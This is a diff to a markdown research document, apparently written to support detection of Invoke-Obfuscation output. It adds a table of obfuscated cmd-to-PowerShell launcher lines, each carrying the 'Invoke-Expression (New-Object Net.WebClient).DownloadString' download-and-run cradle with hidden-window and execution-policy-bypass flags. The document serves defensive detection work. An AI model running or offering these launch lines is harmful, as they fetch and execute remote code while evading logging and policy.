@@ -421,6 +421,72 @@ you can copy the results from all cases for one or more obfuscation methods and 
 
 ### CMD LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
+<table style="word-break: keep-all;">
+ <tr>
+  <th align="center">Case #</th>
+  <th align="center">Option</th>
+  <th align="center">Results</th>
+  <th align="center">Comments</th>
+ </tr>
+ <tr>
+  <td align="center">21</td>
+  <td align="center">LAUNCHER\CMD\*</td>
+  <td>
+   <strong>LAUNCHER\CMD\0      NO EXECUTION FLAGS</strong>
+   <p>cMD  /c   poWersHEll   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\WindOws\SYSTem32\CMd.ExE   /c poweRSHelL   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\WIndOWS\systeM32\Cmd   /cPOweRshell   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>Cmd   /CpOwErSHelL  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\1      -NoExit</strong>
+   <p>C:\wINDOWs\SYstEM32\CmD.EXe  /c  PoWeRsHELL  -nOexi  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmd  /c   pOwerSheLl  -nOE    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>CMd.eXE   /c poweRSheLL -noExI  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\winDOWS\SYSTEM32\CmD  /c pOWersHEll  -NoEX    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\2      -NonInteractive</strong>
+   <p>C:\WIndoWS\sYstEM32\cMd.EXe  /c   PoweRSHell -nonin    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmD.Exe/C   pOweRSHeLl -nOnINtErACTiV    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cMd  /cpowersHeLL  -nONiNtEra   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmD  /CPOweRSHELl  -NOniNt  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\3      -NoLogo</strong>
+   <p>C:\winDOWs\sYstEM32\cmD.eXE   /C   poWerSHELL  -nOlo  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cMD.eXE  /c powERSHelL  -nOloGo    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmd.exe /c  poWeRsHElL  -nOlOG   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\4      -NoProfile</strong>
+   <p>CMd.Exe  /CPOwERsHeLL  -nopRofil   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\wInDOws\system32\CmD  /c  PoWeRSHELL  -NOp  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmd/cPowerShELL  -NOPRO   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>CMd.ExE  /c   pOwersHELl -noprof   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\5      -Command</strong>
+   <p>c:\WinDOWs\sYSTEM32\cMD   /c  PowersHell  -coMMa   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>CmD /cpowErshElL -COMmAN  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cMD/c   pOWersHeLl  -c  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cMD   /C PowErSHeLL  -Co  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\6      -WindowStyle Hidden</strong>
+   <p>cmD/cPowershelL  -wiNdowSTY hIddE   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmd   /c  POwERshELl  -w hiDDen    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>CmD.ExE  /c POwERsHeLL  -WIND  hI   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\WiNDoWS\SysTEM32\cMD  /c  PowErshEll  -wI  hI   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\7      -ExecutionPolicy Bypass</strong>
+   <p>cmd   /cpoweRshEll  -Ex  byPaSS   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>C:\wINDOWS\sYStem32\cMd.EXE  /c pOWersHell  -EXe bypasS   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>c:\WindoWs\SySteM32\cmd  /c  poWERSHeLL  -Ep bYPASS   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>c:\WinDowS\sySTeM32\cMD.Exe   /cPOWErshell  -eXeCUT bYPasS  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   -------------------------------------------------------------------------------------------------------
+   <strong>LAUNCHER\CMD\8      -Wow64 (to path 32-bit powershell.exe)</strong>
+   <p>C:\WinDOWs\sySTEM32\CMd  /c  c:\WIndoWS\SYsWOw64\wiNdOwsPoWErshelL\v1.0\PoWERshElL.exE   "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>CMd.exE/CC:\wiNdows\SySwOw64\WindowSpOWErshelL\v1.0\PoWErshELL.Exe  "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+   <p>cmd  /c   C:\wIndoWS\sYswow64\WINDowSPoWERsHeLL\v1.0\PowErshelL.Exe    "Invoke-Expression (New-Object Net.WebClient).DownloadString"</p>
+  </td>
+  <td align="left">These options just change the way of execution, it might be enough to just check for those keys</td>
+ </tr>
+</table> 
 
 ### WMIC LAUNCHER OBFUSCATION
 [Back to the Contents :page_facing_up:](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#contents)
